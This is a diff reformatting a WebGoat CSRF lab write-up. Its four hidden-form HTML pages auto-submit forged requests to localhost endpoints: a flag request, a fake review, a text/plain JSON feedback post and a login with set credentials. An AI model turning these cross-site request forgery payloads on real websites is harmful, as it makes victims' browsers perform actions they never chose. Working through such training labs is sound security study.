@@ -11,7 +11,9 @@ To pass this one we should issue a POST request to `/WebGoat/csrf/basic-get-flag
 <html>
   <head></head>
   <body>
-    <form name="f" action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
+    <form name="f" 
+          action="http://localhost:8080/WebGoat/csrf/basic-get-flag" 
+          method="POST">
       <input type="hidden" name="csrf" value="false"/>
     </form>
     <script>document.f.submit();</script>
@@ -26,10 +28,14 @@ It's quite strange, but this could be solved in exact same way like the previous
 <html>
   <head></head>
   <body>
-    <form name="f" action="http://localhost:8080/WebGoat/csrf/review" method="POST">
+    <form name="f" 
+          action="http://localhost:8080/WebGoat/csrf/review" 
+          method="POST">
       <input type="hidden" name="reviewText" value="nailed"/>
       <input type="hidden" name="stars" value="5"/>
-      <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9"/>
+      <input type="hidden" 
+             name="validateReq" 
+             value="2aa14227b9a13d0bede0388a7fba9aa9"/>
     </form>
     <script>document.f.submit();</script>
   </body>
@@ -43,7 +49,10 @@ I stuck for a while here. We provided with a writeup on how to exploit some CSRF
 <html>
   <head></head>
   <body>
-    <form name="sample" action="http://localhost:8080/WebGoat/csrf/feedback/message" method="POST" ENCTYPE="text/plain">
+    <form name="sample" 
+          action="http://localhost:8080/WebGoat/csrf/feedback/message" 
+          method="POST" 
+          ENCTYPE="text/plain">
       <input type="hidden" 
              name='{"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","content":"WebGoat is the best!!"}'
       />
@@ -77,9 +86,15 @@ If I grasp it right, to solve is simply to craft a document like this and open i
 <html>
   <head></head>
   <body>
-    <form name="sample" action="http://localhost:8080/WebGoat/login" method="POST">
-	    <input type="hidden" name='username' value='csrf-theuser'/>
-	    <input type="hidden" name='password' value='theuser'/>
+    <form name="sample" 
+          action="http://localhost:8080/WebGoat/login" 
+          method="POST">
+	    <input type="hidden" 
+                   name='username' 
+                   value='csrf-theuser'/>
+	    <input type="hidden" 
+                   name='password' 
+                   value='theuser'/>
     </form>
     <script>document.sample.submit();</script>
   </body>
